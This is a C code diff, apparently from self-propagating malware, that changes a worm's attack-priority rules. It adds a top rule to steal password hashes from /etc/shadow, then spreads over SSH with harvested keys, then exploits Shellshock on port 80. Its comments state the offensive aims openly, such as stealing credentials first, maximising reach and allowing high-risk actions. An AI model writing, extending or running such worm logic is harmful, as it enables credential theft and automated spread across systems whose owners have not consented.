@@ -12,27 +12,38 @@ static int num_rules = 0;
 void init_decision_rules(void) {
     num_rules = 0;
     
-    // SSH Propagation: Highest priority (0) - spread first to maximize reach
-    // Requires: vulnerable (keys found + port 22 open), confidence >= 7, risk <= 6
-    decision_rules[0].cve_id = CVE_SSH_PROPAGATION;
-    decision_rules[0].priority_order = 0;
+    // Shadow Exfiltration: Highest priority (-1) - steal credentials first when privileged
+    // Requires: vulnerable (can read /etc/shadow), confidence >= 10, no port requirement
+    decision_rules[0].cve_id = CVE_SHADOW_EXFILTRATION;
+    decision_rules[0].priority_order = -1;
     decision_rules[0].requires_vulnerable = 1;
-    decision_rules[0].requires_port_open = 22;
-    decision_rules[0].min_confidence = 7;
-    decision_rules[0].max_risk_level = 6;
+    decision_rules[0].requires_port_open = 0;  // No port requirement (local operation)
+    decision_rules[0].min_confidence = 10;     // High confidence (we can actually read the file)
+    decision_rules[0].max_risk_level = 10;     // Allow even at high risk (credential theft is critical)
     decision_rules[0].stealth_required = 0;
     num_rules = 1;
     
-    // Shellshock: Lower priority (1) - exploit after propagation
-    // Requires: vulnerable, port 80 open, confidence >= 7, risk <= 5
-    decision_rules[1].cve_id = CVE_2014_6271;
-    decision_rules[1].priority_order = 1;
+    // SSH Propagation: Second priority (0) - spread after credential theft
+    // Requires: vulnerable (keys found + port 22 open), confidence >= 7, risk <= 6
+    decision_rules[1].cve_id = CVE_SSH_PROPAGATION;
+    decision_rules[1].priority_order = 0;
     decision_rules[1].requires_vulnerable = 1;
-    decision_rules[1].requires_port_open = 80;
+    decision_rules[1].requires_port_open = 22;
     decision_rules[1].min_confidence = 7;
-    decision_rules[1].max_risk_level = 5;
+    decision_rules[1].max_risk_level = 6;
     decision_rules[1].stealth_required = 0;
     num_rules = 2;
+    
+    // Shellshock: Lower priority (1) - exploit after propagation
+    // Requires: vulnerable, port 80 open, confidence >= 7, risk <= 5
+    decision_rules[2].cve_id = CVE_2014_6271;
+    decision_rules[2].priority_order = 1;
+    decision_rules[2].requires_vulnerable = 1;
+    decision_rules[2].requires_port_open = 80;
+    decision_rules[2].min_confidence = 7;
+    decision_rules[2].max_risk_level = 5;
+    decision_rules[2].stealth_required = 0;
+    num_rules = 3;
 }
 
 // Check if CVE is vulnerable
